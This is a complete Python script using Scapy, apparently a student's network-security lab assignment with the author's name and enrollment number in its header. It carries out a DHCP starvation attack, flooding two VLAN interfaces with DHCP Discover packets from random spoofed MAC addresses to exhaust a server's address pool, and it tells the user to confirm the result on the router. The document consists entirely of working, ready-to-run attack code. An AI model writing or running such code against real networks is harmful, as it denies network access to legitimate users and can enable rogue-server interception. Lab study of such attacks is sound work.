#!/usr/bin/env python3
# ============================================
# DHCP Starvation Attack Script
# Autor: Sael German Garcia
# Matricula: 2025-0725
# Descripcion: Agota el pool DHCP del servidor
#              legitimo enviando Discovers con
#              MACs falsas
# ============================================

from scapy.all import *
import random
import sys
import threading

INTERFACES = ["ens4.10", "ens4.20"]

def random_mac():
    first = random.randint(0, 255) & 0xFC
    return '%02x:%02x:%02x:%02x:%02x:%02x' % (
        first,
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def mac_to_bytes(mac):
    return bytes(int(x, 16) for x in mac.split(':'))

def flood_iface(interface, count):
    print(f"[*] Flooding en {interface}...")
    for i in range(count):
        fake_mac = random_mac()
        pkt = (
            Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(
                op=1,
                chaddr=mac_to_bytes(fake_mac),
                xid=random.randint(1, 0xFFFFFFFF)
            ) /
            DHCP(options=[
                ('message-type', 'discover'),
                ('end',)
            ])
        )
        sendp(pkt, iface=interface, verbose=0)
        if (i+1) % 50 == 0:
            print(f"[+] {interface} -> Enviados: {i+1}/{count} | MAC: {fake_mac}")
    print(f"[+] {interface} completado!")

def dhcp_starvation(count):
    print("="*50)
    print("  DHCP Starvation Attack")
    print("  Autor: Sael German Garcia")
    print("  Matricula: 2025-0725")
    print("="*50)
    print(f"[*] Interfaces: {INTERFACES}")
    print(f"[*] Paquetes por interfaz: {count}")
    print("[*] Iniciando ataque...\n")

    threads = []
    for iface in INTERFACES:
        t = threading.Thread(target=flood_iface, args=(iface, count))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"\n[+] Ataque completado!")
    print("[!] Verifica en R1: show ip dhcp binding")
    print("[!] Verifica en R1: show ip dhcp pool")

if __name__ == "__main__":
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 200
    dhcp_starvation(count)
